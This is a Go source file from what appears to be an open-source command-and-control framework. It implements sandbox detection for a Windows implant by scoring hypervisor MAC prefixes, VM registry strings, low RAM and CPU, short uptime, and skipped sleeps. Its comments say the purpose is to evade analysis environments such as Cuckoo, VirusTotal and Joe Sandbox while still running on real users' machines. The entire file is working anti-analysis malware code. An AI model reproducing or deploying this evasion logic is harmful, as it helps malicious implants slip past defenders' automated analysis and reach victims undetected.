package evasion

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// Sandbox / analysis-environment detection.
//
// IsSandbox returns true if the current host shows enough signals to be
// considered an automated analysis or sandbox environment (Cuckoo,
// CrowdStrike on-prem sandbox, VirusTotal detonators, Joe Sandbox, etc.)
// rather than a real user's machine.
//
// We run a layered set of cheap heuristics and tally evidence rather
// than relying on any one signal. A pure registry-key check trips on
// developers running VMs, and a MAC-vendor check alone misses bare-metal
// sandboxes. Together they produce a useful score.
//
// The detection is deliberately conservative — false positives mean we
// silently exit on a real user's machine. We require at least two
// independent signals before declaring a sandbox.

import (
	"net"
	"strings"
	"time"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// SandboxReport captures the outcome of the heuristic run so callers
// can log or act on individual signals if they want richer behaviour
// than just "exit on detection".
type SandboxReport struct {
	Detected bool
	Score    int
	Reasons  []string
}

// IsSandbox runs all available heuristics and returns true if the
// cumulative score crosses the detection threshold.
func IsSandbox() bool {
	return Sandbox().Detected
}

// Sandbox runs the full detection suite and returns the breakdown.
// Useful for debug builds where we want to know *which* signals fired.
func Sandbox() SandboxReport {
	r := SandboxReport{}

	if vmMACDetected(&r) {
		r.Score += 2 // strong signal — real users very rarely show these MACs
	}
	if vmRegistryDetected(&r) {
		r.Score += 2
	}
	if lowResourceHost(&r) {
		r.Score += 1
	}
	if freshUptime(&r) {
		r.Score += 1
	}
	if sleepSkipped(&r) {
		r.Score += 3 // very strong — only instrumented hosts skip sleeps
	}

	// Threshold tuned conservatively. Any single weak signal is not
	// enough; we want at least one strong (>=2) signal plus corroboration,
	// or the sleep-skip canary on its own.
	r.Detected = r.Score >= 3

	// {{if .Config.Debug}}
	if r.Detected {
		log.Printf("[sandbox] DETECTED score=%d reasons=%v", r.Score, r.Reasons)
	} else {
		log.Printf("[sandbox] clean score=%d reasons=%v", r.Score, r.Reasons)
	}
	// {{end}}
	return r
}

// vmMACDetected scans network interfaces for MAC OUIs registered to
// hypervisor vendors. Returns true (and appends a reason) on any hit.
func vmMACDetected(r *SandboxReport) bool {
	// First three octets of MAC addresses owned by common hypervisor
	// vendors. Lowercase, colon-separated. Sourced from IEEE OUI registry.
	knownVMPrefixes := []string{
		"00:05:69", // VMware
		"00:0c:29", // VMware
		"00:1c:14", // VMware
		"00:50:56", // VMware
		"08:00:27", // VirtualBox
		"0a:00:27", // VirtualBox host-only
		"00:15:5d", // Hyper-V
		"00:03:ff", // Hyper-V legacy
		"52:54:00", // QEMU/KVM
		"00:16:3e", // Xen
		"00:1c:42", // Parallels
	}
	ifaces, err := net.Interfaces()
	if err != nil {
		return false
	}
	for _, iface := range ifaces {
		mac := strings.ToLower(iface.HardwareAddr.String())
		if len(mac) < 8 {
			continue
		}
		prefix := mac[:8]
		for _, vmPrefix := range knownVMPrefixes {
			if prefix == vmPrefix {
				r.Reasons = append(r.Reasons, "vm-mac:"+prefix)
				return true
			}
		}
	}
	return false
}

// vmRegistryDetected checks a handful of registry locations that
// hypervisor guest tools always populate.
func vmRegistryDetected(r *SandboxReport) bool {
	// Each entry is a (root, path, value-name) triple. We match if any
	// of these reads back a value containing one of the marker strings.
	checks := []struct {
		root windows.Handle
		path string
		name string
	}{
		{windows.HKEY_LOCAL_MACHINE, `HARDWARE\DESCRIPTION\System`, "SystemBiosVersion"},
		{windows.HKEY_LOCAL_MACHINE, `HARDWARE\DESCRIPTION\System`, "VideoBiosVersion"},
		{windows.HKEY_LOCAL_MACHINE, `SYSTEM\ControlSet001\Services\Disk\Enum`, "0"},
	}
	markers := []string{"vmware", "vbox", "virtualbox", "qemu", "xen", "parallels", "hyper-v"}

	for _, c := range checks {
		k, err := registry.OpenKey(registry.Key(c.root), c.path, registry.QUERY_VALUE)
		if err != nil {
			continue
		}
		value, _, err := k.GetStringValue(c.name)
		k.Close()
		if err != nil {
			continue
		}
		low := strings.ToLower(value)
		for _, m := range markers {
			if strings.Contains(low, m) {
				r.Reasons = append(r.Reasons, "vm-reg:"+m)
				return true
			}
		}
	}
	return false
}

// lowResourceHost flags machines with implausibly small specs — many
// public sandboxes hand out 1 CPU and < 2 GB RAM to keep cost down.
func lowResourceHost(r *SandboxReport) bool {
	var memStatus memoryStatusEx
	memStatus.dwLength = uint32(unsafe.Sizeof(memStatus))
	if err := globalMemoryStatusEx(&memStatus); err == nil {
		const gb = uint64(1024 * 1024 * 1024)
		if memStatus.ullTotalPhys < 2*gb {
			r.Reasons = append(r.Reasons, "low-ram")
			return true
		}
	}

	var sysInfo systemInfo
	getNativeSystemInfo(&sysInfo)
	if sysInfo.dwNumberOfProcessors < 2 {
		r.Reasons = append(r.Reasons, "low-cpu")
		return true
	}
	return false
}

// freshUptime treats a host that's been up for under 10 minutes as
// suspicious. Real users boot once a day or less; sandboxes spin a
// fresh VM per sample.
func freshUptime(r *SandboxReport) bool {
	tickCount := getTickCount64()
	const tenMinutesMs = 10 * 60 * 1000
	if tickCount < tenMinutesMs {
		r.Reasons = append(r.Reasons, "fresh-uptime")
		return true
	}
	return false
}

// sleepSkipped is the canary heuristic — we ask the OS to sleep for two
// seconds and time how long it actually took. Sandboxes that hook
// SleepEx/NtDelayExecution to compress analysis time return early. The
// 1500ms threshold gives generous slack for scheduling jitter.
func sleepSkipped(r *SandboxReport) bool {
	start := getTickCount64()
	time.Sleep(2 * time.Second)
	elapsed := getTickCount64() - start
	if elapsed < 1500 {
		r.Reasons = append(r.Reasons, "sleep-skip")
		return true
	}
	return false
}

// memoryStatusEx mirrors the Win32 MEMORYSTATUSEX struct so we can call
// GlobalMemoryStatusEx without pulling in cgo or a third-party helper.
type memoryStatusEx struct {
	dwLength                uint32
	dwMemoryLoad            uint32
	ullTotalPhys            uint64
	ullAvailPhys            uint64
	ullTotalPageFile        uint64
	ullAvailPageFile        uint64
	ullTotalVirtual         uint64
	ullAvailVirtual         uint64
	ullAvailExtendedVirtual uint64
}

// systemInfo mirrors Win32 SYSTEM_INFO. We only consume dwNumberOfProcessors
// so the layout of the union fields doesn't matter beyond preserving size.
type systemInfo struct {
	wProcessorArchitecture      uint16
	wReserved                   uint16
	dwPageSize                  uint32
	lpMinimumApplicationAddress uintptr
	lpMaximumApplicationAddress uintptr
	dwActiveProcessorMask       uintptr
	dwNumberOfProcessors        uint32
	dwProcessorType             uint32
	dwAllocationGranularity     uint32
	wProcessorLevel             uint16
	wProcessorRevision          uint16
}

var (
	modkernel32sandbox       = windows.NewLazySystemDLL("kernel32.dll")
	procGlobalMemoryStatusEx = modkernel32sandbox.NewProc("GlobalMemoryStatusEx")
	procGetNativeSystemInfo  = modkernel32sandbox.NewProc("GetNativeSystemInfo")
	procGetTickCount64Sb     = modkernel32sandbox.NewProc("GetTickCount64")
)

func globalMemoryStatusEx(m *memoryStatusEx) error {
	r1, _, e1 := procGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(m)))
	if r1 == 0 {
		return e1
	}
	return nil
}

func getNativeSystemInfo(si *systemInfo) {
	procGetNativeSystemInfo.Call(uintptr(unsafe.Pointer(si)))
}

// getTickCount64 returns milliseconds since boot. We call it via NewProc
// because golang.org/x/sys/windows doesn't expose the wrapper.
func getTickCount64() uint64 {
	r0, _, _ := procGetTickCount64Sb.Call()
	return uint64(r0)
}
